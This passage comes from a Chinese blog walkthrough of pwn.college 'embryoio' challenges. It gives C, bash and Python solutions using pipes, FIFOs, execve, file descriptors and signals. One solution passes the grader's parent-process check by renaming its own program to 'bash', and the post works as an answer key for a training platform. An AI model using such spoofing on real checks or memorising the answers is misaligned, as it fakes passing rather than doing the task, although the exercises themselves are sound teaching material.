class="hljs-keyword">if</span> (fpid == <span class="hljs-number">0</span>)<br>        &#123;<br>            close(fd[<span class="hljs-number">1</span>]);<span class="hljs-comment">//关闭管道写，同上</span><br>            dup2(fd[<span class="hljs-number">0</span>], STDIN_FILENO);<span class="hljs-comment">//dup2将标准输入(STDIN_FILENO)重定向到管道的读取端 fd[0]，则下面cat的输入就不是来自默认终端输入，而是从管道中读取</span><br>            execl(<span class="hljs-string">&quot;/usr/bin/cat&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            wait(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>​	通过这样的重定向，子进程1的输出会成为子进程2的输入，实现了进程之间的管道通信。在这个具体的例子中，子进程1执行的程序是 <code>/challenge/embryoio_level60</code>，它的输出通过管道传递给子进程2，而子进程2执行的程序是 <code>/usr/bin/cat</code>，将管道的内容输出到标准输出。</p>
<h2 id="level-66"><a class="markdownIt-Anchor" href="#level-66"></a> level 66</h2>
<blockquote>
<p>注意find的命令格式</p>
<p>find path -option 【-print】 【-exec -ok | xargs | grep】 【command {} ;】</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l_liangkk/article/details/81294260">Linux下find命令详解</a></p>
</blockquote>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/challenge/</span>embryoio_level66 -exec <span class="hljs-regexp">/challenge/</span>embryoio_level66 &#123;&#125; \;<br></code></pre></td></tr></table></figure>
<h2 id="level-68"><a class="markdownIt-Anchor" href="#level-68"></a> level 68</h2>
<blockquote>
<p>这里就是使用printf打印多个参数</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">/challenge/embryoio_level68 $(printf &#x27; oychnztsoh%0.s&#x27; &#123;1..307&#125;)<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">printf</span> 是一个格式化输出的命令，用于按照指定格式打印文本。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">&#x27; oychnztsoh%0.s&#x27;</span> 是 <span class="hljs-built_in">printf</span> 的格式字符串。其中 %0.s 是一个格式说明符，表示输出一个宽度为0的字符串，这里主要是为了生成 307 次输出而不添加额外的字符，只输出 <span class="hljs-string">&quot; oychnztsoh&quot;</span> 这个字符串。前面有一个空格就是为了分隔开不同的参数，否则就连在一起成为一个参数了</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&#123;1..307&#125; 是 Bash shell 中的一种用法，表示一个整数序列，从1到307。这里使用这个序列来让 <span class="hljs-built_in">printf</span> 命令打印 307 个 <span class="hljs-string">&quot; godxqtxpvg&quot;</span> 字符串。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">最后作为参数给特定程序</span><br></code></pre></td></tr></table></figure>
<h2 id="level-70-71"><a class="markdownIt-Anchor" href="#level-70-71"></a> level 70-71</h2>
<blockquote>
<p>使用c程序的execv来伪造shell脚本运行</p>
</blockquote>
<h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如下为题目要求</span><br><span class="hljs-comment"># 使用shell脚本来运行程序</span><br>- the challenge checks <span class="hljs-keyword">for</span> a specific parent process : shellscript<br><span class="hljs-comment"># 程序在执行时的环境变量是空的，即程序执行时，只能有系统默认的一些环境变量，不能存在自己设置的。反应到C程序中，就是argc要求为0，shell脚本就是 env -i /target_file 来执行程序</span><br>- the challenge will check that the environment is empty (except LC_CTYPE, <span class="hljs-built_in">which</span> is impossible to get rid of <span class="hljs-keyword">in</span> some cases)<br><span class="hljs-comment"># 这里要求argv参数的固定位置存在指定字符串，这里c中使用execve等来处理，shell脚本可以使用 printf 来生成多个字符放在执行程序的参数位置</span><br>- the challenge will check that argv[NUM] holds value VALUE (listed to the right as NUM:VALUE) : 266:uxzdewxjpd<br><span class="hljs-comment"># 这里就是要求环境变量，c中也可以用execve来处理，shell中使用export或者直接赋值，但是这里变量名是用数字来命名的，系统又不允许这样(我没找到具体的实现方法，按理来说c可以这样搞，依赖系统调用的应该也能搞，空闲分析一下c的execve函数)</span><br>- the challenge will check that <span class="hljs-built_in">env</span>[KEY] holds value VALUE (listed to the right as KEY:VALUE) : 178:lohijbkutd<br></code></pre></td></tr></table></figure>
<p>​	由于checker.py函数只是检测命令执行的文件名，第一个bash检测就是检测运行的程序名为<code>bash</code>即可，第二个检测是bash加一个结尾为<code>.sh</code>的参数即可。所以这里就把自己编写的c语言程序改名为bash，然后加个不适用的参数<code>a.sh</code> 即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bash</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then,&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] most likely, this is what you do by default anyways, but we&#x27;ll check just in case...&quot;</span>)<br>    check_exe_basename(process, <span class="hljs-string">&#x27;bash&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">1</span>, <span class="hljs-string">f&quot;The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: <span class="hljs-subst">&#123;process.cmdline()&#125;</span>&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_shellscript</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is a non-interactive shell script.&quot;</span>)<br><br>    <span class="hljs-keyword">assert</span> os.path.basename(process.exe()) <span class="hljs-keyword">in</span> [ <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span> ], <span class="hljs-string">f&quot;Process interpreter must be &#x27;sh&#x27; or &#x27;bash&#x27;. Yours is: <span class="hljs-subst">&#123;os.path.basename(process.exe())&#125;</span>&quot;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> process.cmdline()[<span class="hljs-number">1</span>].endswith(<span class="hljs-string">&quot;.sh&quot;</span>), <span class="hljs-string">f&quot;The shell process must be executing a shell script that you wrote like this: `bash my_script.sh`&quot;</span><br></code></pre></td></tr></table></figure>
<p>​	同时 <code>execve</code> 并不会创建一个新的进程，而是替换当前进程的内容。但是这里需要使用子进程来执行 <code>execve</code> 函数，因为父进程必须为bash，这里就是通过父进程名为bash，子进程执行来通过检测。可以参照 <code>level 1</code> 的 exp3，通过父进程名称为 <code>bash</code> 的检测，然后再由 <code>a.sh</code> 的参数伪造(不执行)，即可通过检测</p>
<p>​	但是测试只使用 main 来运行 execve 替换进程就不成功。这里感觉还是参数的问题，直接替换的话，后面紧跟的 <code>.sh</code> 应该就识别不到了(还是有点糊涂)</p>
<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-type">char</span>* env[] = &#123;<span class="hljs-string">&quot;178=lohijbkutd&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<span class="hljs-comment">//设置environment variable 178</span><br>        <span class="hljs-type">char</span>* argv[<span class="hljs-number">268</span>] = &#123;<span class="hljs-string">&quot;embryoio_level71&quot;</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">267</span>; i ++)&#123;<span class="hljs-comment">//设置argv[266]，这里i的最大取值为266，比268小2，因为argv共268个元素，其中0为embryoio_level71，后面266个为uxzdewxjpd，最后要留一个元素为NULL，它自己赋值的，但是一定需要保留</span><br>            argv[i] = <span class="hljs-string">&quot;uxzdewxjpd&quot;</span>;<br>        &#125;<br>        execve(<span class="hljs-string">&quot;/challenge/embryoio_level71&quot;</span>, argv, env);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="level-72"><a class="markdownIt-Anchor" href="#level-72"></a> level 72</h2>
<blockquote>
<p>重定向输入可以从后面往前</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这里的重定向输入可以用小于号从后面往前面</span><br>- the challenge will check that input is redirected from a specific file path : dpgobq<br><span class="hljs-comment"># wp</span><br><span class="hljs-built_in">mkdir</span> /tmp/ntmizw;<span class="hljs-built_in">cd</span> /tmp/ntmizw;<span class="hljs-built_in">touch</span> dpgobq;bash /home/hacker/b.sh &lt; dpgobq<br></code></pre></td></tr></table></figure>
<h2 id="level-73"><a class="markdownIt-Anchor" href="#level-73"></a> level 73</h2>
<blockquote>
<p>这里依然注意对于父子进程的检查</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">需求</span><br>- the challenge checks for a specific parent process : shellscript<br>- the challenge will check that it is running in a specific current working directory : /tmp/svlava<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里就是说.sh和challenge的工作目录需要不同</span><br>- the challenge will check to make sure that the parent&#x27;s parent CWD to be different than the challenge&#x27;s CWD<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">b.sh</span><br>cd /tmp/svlava;exec /challenge/embryoio_level73<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">d.sh</span><br>bash b.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">~目录执行的命令，-c表示将后面的字符串作为命令来执行</span><br>bash -c &quot;bash d.sh&quot;/bash d.sh(后面那种情况不知道为啥子突然就可以用了，可能之前每设置好，但是这种更容易理解)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">成功通过，返回结果</span><br>[INFO] My working directory is: /tmp/svlava.<br>[INFO] Parent working directory is: /home/hacker.<br></code></pre></td></tr></table></figure>
<p>​	这里要求父进程为一个 <code>.sh</code> 文件，同时父进程的工作目录和 <code>/challenge/embryoio_level73</code> 的工作目录不同。</p>
<ul>
<li>对于 <code>exec</code> ，如果不使用这个，那么它重新开启一个新进程执行challenge，父进程 <code>b.sh</code> 的工作目录受cd影响，子进程的工作目录也一样在cd后的目录，所以不能通过检测。而如果使用 <code>exec</code> ，那么challenge替换掉 <a target="_blank" rel="noopener" href="http://b.sh">b.sh</a>，它的父进程就是 <a target="_blank" rel="noopener" href="http://d.sh">d.sh</a>，那么工作目录就不一样了</li>
<li>然后考虑在目录/home/hacker执行 <code>bash d.sh</code> ，它确保父进程 <code>d.sh</code> 的工作目录为/home/hacker，子进程 <code>b.sh/challenge</code>的工作目录为/tmp/svlava，满足了条件</li>
</ul>
<h2 id="level-74-77"><a class="markdownIt-Anchor" href="#level-74-77"></a> level 74-77</h2>
<blockquote>
<p>python中环境变量用os设置，参数可以直接设置</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess,os<br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level77&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">203</span>):<br>    args.append(<span class="hljs-string">&quot;wysilgjbsx&quot;</span>)<br>os.environ.clear()<br>os.environ[<span class="hljs-string">&quot;118&quot;</span>] = <span class="hljs-string">&quot;beyqbsuxdc&quot;</span><br>subprocess.run(args)<br></code></pre></td></tr></table></figure>
<h2 id="level-79"><a class="markdownIt-Anchor" href="#level-79"></a> level 79</h2>
<blockquote>
<p>python中subprocess的子进程启动，这个比shell简单太多了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess,os<br><span class="hljs-comment"># os.mkdir(&quot;/tmp/wnufru&quot;)使用这个方法，父进程也移动了</span><br>os.chdir(<span class="hljs-string">&quot;/tmp/wnufru&quot;</span>)<br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level79&quot;</span>]<br>subprocess.run(args, cwd = <span class="hljs-string">&quot;/tmp/wnufru&quot;</span>)<span class="hljs-comment"># 这里就是设置子进程的目录</span><br></code></pre></td></tr></table></figure>
<h2 id="level-86-87"><a class="markdownIt-Anchor" href="#level-86-87"></a> level 86-87</h2>
<blockquote>
<p>怎么说呢，这个意思就是让你写一个shell脚本，来计算它给出的表达式，感觉像写一个简易计算器，但是不会脚本，就直接手撸计算了，算是混过去的</p>
</blockquote>
<h2 id="level-88"><a class="markdownIt-Anchor" href="#level-88"></a> level 88</h2>
<blockquote>
<p>这里要求固定argv[0]，可以用之前c的歪路搞，但是shell可以使用链接来处理</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /challenge/embryoio_level88 /tmp/olrqmc <span class="hljs-comment">#创建链接</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#添加/tmp到环境变量，确保搜索可执行文件时也会考虑当前目录</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/tmp/olrqmc&quot;</span> &gt; b.sh<br>bash b.sh <br></code></pre></td></tr></table></figure>
<h2 id="level-90"><a class="markdownIt-Anchor" href="#level-90"></a> level 90</h2>
<blockquote>
<p>要知道fifo是什么东西，以及它读写的性质</p>
</blockquote>
<p>​	简单来说就是一个有实体的管道，创建时会以文件的形式出现在当前目录中，好像是单工通信，只能由一方传给另一方，而且如果没有消费者，生产者会阻塞等待，所以我们在运行时需要并发运行两个进程，不然会阻塞。</p>
<p>​	也是这个题的原因，去真正了解了一下Linux中的管道机制，获得了很多知识，具体看 <code>Linux管道机制</code> 那篇博客，<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1wc411x7zj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=17ac9da9453dbd6d64b9616668574c5f">【管道】传统nc反弹shell语句解析_参考视频</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/challenge/embryoio_level90 &lt; tmp&#x27;</span> &gt; b.sh<br><span class="hljs-built_in">echo</span> ergtqvym &gt; tmp | bash b.sh<br></code></pre></td></tr></table></figure>
<h2 id="level-92"><a class="markdownIt-Anchor" href="#level-92"></a> level 92</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> tmp1<br><span class="hljs-built_in">mkfifo</span> tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;(/challenge/embryoio_level92 &lt; tmp1) &gt; tmp&#x27;</span> &gt; b.sh<br><span class="hljs-built_in">echo</span> hprrtwgz &gt; tmp1 | bash b.sh<br><span class="hljs-comment"># 然后另外起一个shell执行 cat tmp，因为这里fifo的特性，只有读写都有才会继续进行，否则会阻塞，所以需要另外查看</span><br></code></pre></td></tr></table></figure>
<h2 id="level-93"><a class="markdownIt-Anchor" href="#level-93"></a> level 93</h2>
<blockquote>
<p>通过两个fifo来创建可交互的双通道</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">shell 脚本</span><br>/challenge/embryoio_level* &lt; t1 &gt; t2 &amp;<br>cat &lt; t2 &amp; # 获取程序向t2的输出到终端<br>cat &gt; t1 # 输入内容给t1<br></code></pre></td></tr></table></figure>
<p>​	这里需要先创建两个fifo管道t1，t2，然后 <code>&amp;</code> 是后台运行。这里通过 <code>cat &lt; t2 &amp; cat &gt; t1</code> 创建了一个可交互的双通道，challenge的输出给了t2，再由 cat &lt; t2 显示到终端，然后终端通过 cat &gt; t1 输入数据到终端，数据给了t1，再由t1给challenge</p>
<h2 id="level-94"><a class="markdownIt-Anchor" href="#level-94"></a> level 94</h2>
<blockquote>
<p>理解exec可以绑定文件描述符</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> t1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec 82&lt;t1;/challenge/embryoio_level*&#x27;</span> &gt; b.sh<br>bash b.sh &amp; <span class="hljs-built_in">cat</span> &gt; t1  <span class="hljs-comment">#?没搞懂，等会再看看</span><br><span class="hljs-comment"># 之后再输入adbsmqfp</span><br></code></pre></td></tr></table></figure>
<p>​	这里就是cat获取标准输入给t1，然后82文件描述符从t1中获取输入。这里感觉是个幌子，感觉像是这里的输入通过0描述符给了程序，因为82文件描述符没有与程序相关联，在这里更像是将82与0交汇成了一个管道，然后程序从标准输入获取信息也被视为了从82文件描述符获取信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;adbsmqfp&#x27; &gt; d.sh<br>exec 82 &lt; d.sh # exec可以绑定文件描述符<br>echo &#x27;/challenge/embryoio_level*&#x27; &gt; b.sh<br>bash b.sh 0&lt;&amp;82<br></code></pre></td></tr></table></figure>
<p>​	这里就是将d.sh的内容写入到82文件描述符中，然后再通过运行0&lt;&amp;82将82文件描述符拷贝到0标准输入中，让82 fd的内容作为输入</p>
<h2 id="level-97"><a class="markdownIt-Anchor" href="#level-97"></a> level 97</h2>
<blockquote>
<p>了解linux下信号的知识，可以利用kill命令发送信号</p>
<p>kill -SIGUSR2 2487可以发送响应信号，注意需要bash <a target="_blank" rel="noopener" href="http://b.sh">b.sh</a>&amp;后台启动，或者另起终端来运行kill，因为需要程序的进程存在才可以接收信号</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash b.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">以下是回应</span><br>[TEST] You must send me (PID 2487) the following signals, in exactly this order: [&#x27;SIGINT&#x27;]<br>^C[INFO] Received signal 2! Is it correct?#这里要求发送&#x27;SIGINT&#x27;类型的信号，刚好ctrl+c就是一个，所以就直接通过了<br>[GOOD] Correct!<br>[INFO] Nice, you sent one of the signals!<br>[GOOD] You successfully passed the signal challenges!<br></code></pre></td></tr></table></figure>
<p>​	这里 <code>SIGUSR1/SIGUSR2</code> 通常被用户定义为一个自定义信号，用于进程间通信或执行特定的操作。程序可以捕获和处理这个信号。<code>SIGINT</code> 由终端发送给前台进程组中的所有进程，通常是通过按下键盘上的Ctrl+C来触发。这个信号通常用于请求进程终止。<code>SIGHUP</code> 通常由终端断开连接时发送给进程。在Unix系统中，它可能会导致某些进程重新读取配置文件或进行清理操作。</p>
<h2 id="level-101"><a class="markdownIt-Anchor" href="#level-101"></a> level 101</h2>
<blockquote>
<p>python中设置argv的方法</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br>args = <span class="hljs-string">&quot;/challenge/embryoio_level101&quot;</span><br>argv = <span class="hljs-string">&quot;/tmp/yedczc&quot;</span><br>subprocess.run([argv], executable=args) <span class="hljs-comment">#分别设置参数和可执行文件</span><br></code></pre></td></tr></table></figure>
<h2 id="level-103-106"><a class="markdownIt-Anchor" href="#level-103-106"></a> level 103-106</h2>
<blockquote>
<p>只不过是使用python再用fifo来重定向，与shell脚本差不多</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sehll"># 这是level 106<br>python c.py &lt; t1 &gt; t2 &amp;<br>cat &lt; t2 &amp;<br>cat &gt; t1<br><br># c.py<br>import subprocess,os<br>args = &quot;/challenge/embryoio_level106&quot;<br>subprocess.run(args)<br></code></pre></td></tr></table></figure>
<h2 id="level-107"><a class="markdownIt-Anchor" href="#level-107"></a> level 107</h2>
<blockquote>
<p>注意dup2在python中的使用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br>fd=os.dup2(<span class="hljs-number">0</span>,<span class="hljs-number">279</span>)<span class="hljs-comment">#将标准输入(文件描述符0)复制到文件描述符279</span><br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level107&quot;</span>]<br><span class="hljs-comment"># stdion=279指定了子进程的标准输入为文件描述符279</span><br><span class="hljs-comment"># pass_fds=[0,1,2,279] 用于将文件描述符传递给子进程。这里传递了标准输入0、标准输出1、标准错误2以及刚刚复制的文件描述符279</span><br>p=subprocess.run(args, stdin=<span class="hljs-number">279</span>, pass_fds=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">279</span>])<br></code></pre></td></tr></table></figure>
<h2 id="level-114"><a class="markdownIt-Anchor" href="#level-114"></a> level 114</h2>
<blockquote>
<p>在c程序中设置argv[0]</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* env[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">char</span>* args[] = &#123;<span class="hljs-string">&quot;/tmp/jpvszz&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level114&quot;</span>, args, env);<span class="hljs-comment">//第一个参数是可执行程序，后面的args是程序的参数</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        pwncollege();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="level-125"><a class="markdownIt-Anchor" href="#level-125"></a> level 125</h2>
<blockquote>
<p>两种方法，一种直接使用子进程，另一种使用管道传输数据。虽然都是用python来计算结果</p>
</blockquote>
<h3 id="wp1-2"><a class="markdownIt-Anchor" href="#wp1-2"></a> wp1</h3>
